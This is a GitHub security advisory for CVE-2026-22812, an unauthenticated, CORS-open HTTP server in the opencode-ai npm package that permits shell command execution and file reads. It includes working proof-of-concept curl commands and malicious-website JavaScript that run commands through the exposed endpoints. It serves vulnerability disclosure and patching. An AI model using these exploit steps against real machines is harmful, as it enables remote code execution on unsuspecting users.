# [H] OpenCode's Unauthenticated HTTP Server Allows Arbitrary Command Execution

## Summary
Severity: High
Advisory: GHSA-vxw4-wv6m-9hhh
CVE: CVE-2026-22812
CWE: CWE-306, CWE-749, CWE-942
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-vxw4-wv6m-9hhh
Type: github-advisory

## Affected
- npm: `opencode-ai` — affected >=0 <1.0.216

## Details
*Previously reported via email to support@sst.dev on 2025-11-17 per the security policy in [opencode-sdk-js/SECURITY.md](https://github.com/sst/opencode-sdk-js/blob/main/SECURITY.md). No response received.*

### Summary

OpenCode automatically starts an unauthenticated HTTP server that allows any local process—or any website via permissive CORS—to execute arbitrary shell commands with the user's privileges.

### Details

When OpenCode starts, it spawns an HTTP server (default port 4096+) with no authentication. Critical endpoints exposed:

- `POST /session/:id/shell` - Execute shell commands (`server.ts:1401`)
- `POST /pty` - Create interactive terminal sessions (`server.ts:267`)
- `GET /file/content?path=` - Read arbitrary files (`server.ts:1868`)

The server is started automatically in `cli/cmd/tui/worker.ts:36` via `Server.listen()`.

No authentication middleware exists in `server/server.ts`. The server uses permissive CORS (`.use(cors())` with default `Access-Control-Allow-Origin: *`), enabling browser-based exploitation.

### PoC

**Local exploitation:**

```bash
API="http://127.0.0.1:4096"  # update with actual port
SESSION_ID=$(curl -s -X POST "$API/session" -H "Content-Type: application/json" -d '{}' | jq -r '.id')
curl -s -X POST "$API/session/$SESSION_ID/shell" -H "Content-Type: application/json" \
  -d '{"agent": "build", "command": "echo PWNED > /tmp/pwned.txt"}'
cat /tmp/pwned.txt  # outputs: PWNED
```

**Browser-based exploitation:**

A malicious website can exploit visitors who have OpenCode running. Confirmed working in Firefox. PoC available upon request.

```javascript
// Malicious website JavaScript
fetch('http://127.0.0.1:4096/session', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{}'
})
.then(r => r.json())
.then(session => {
  fetch(`http://127.0.0.1:4096/session/${session.id}/shell`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({agent: 'build', command: 'id > /tmp/pwned.txt'})
  });
});
```

Note: Chrome 142+ may prompt for Local Network Access permission. Firefox does not.

### Impact

**Remote Code Execution** via two vectors:

1. **Local process**: Any malicious npm package, script, or compromised application can execute commands as the user running OpenCode.

2. **Browser-based (confirmed in Firefox)**: Any website can execute commands on visitors who have OpenCode running. This enables drive-by attacks via malicious ads, compromised websites, or phishing pages.

With `--mdns` flag, the server binds to `0.0.0.0` and advertises via Bonjour, extending the attack surface to the entire local network.

*Code analysis, CVSS scoring, and documentation assisted by Claude AI (Opus 4.5). Vulnerability verification and PoC testing performed by the reporter.*

## References
- https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh
- https://nvd.nist.gov/vuln/detail/CVE-2026-22812
- https://github.com/anomalyco/opencode/commit/7d2d87fa2c44e32314015980bb4e59a9386e858c
- https://github.com/anomalyco/opencode
